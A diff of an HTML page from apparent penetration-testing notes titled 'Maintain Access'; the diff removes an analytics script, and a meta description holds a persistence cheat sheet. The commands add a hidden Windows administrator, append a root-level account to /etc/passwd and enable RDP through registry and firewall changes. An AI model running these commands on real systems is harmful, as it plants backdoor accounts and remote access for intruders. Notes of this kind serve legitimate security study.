@@ -12,18 +12,6 @@
     <meta name="description" content="" />
     <link rel="stylesheet" href="../../stiluslapom.css" />
 
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
-}
-</script>
-
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Notes - Maintain Access"/>
 <meta name="twitter:description" content="Create new user # windows &gt; net user fm pass123 /add &amp;&amp; net localgroup administrators fm /add # linux # Generate password hash &gt; openssl passwd -1 -salt fm pass123 # Add to /etc/passwd &gt; echo &#39;fm:$1$fm$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd # If running a script &gt; echo &#39;echo &#34;fm:\$1\$fm\$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash&#34; &gt;&gt; /etc/passwd&#39; &gt; script.sh Enable rdp # powershell &gt; Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39;-name &#34;fDenyTSConnections&#34; -Value 0 &gt; Enable-NetFirewallRule -DisplayGroup &#34;Remote Desktop&#34; &gt; Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#39; -name &#34;UserAuthentication&#34; -Value 1 # cmd &gt; reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f Proof Collect proof of compromised &gt; hostname &amp;&amp; id &amp;&amp; cat proof."/>
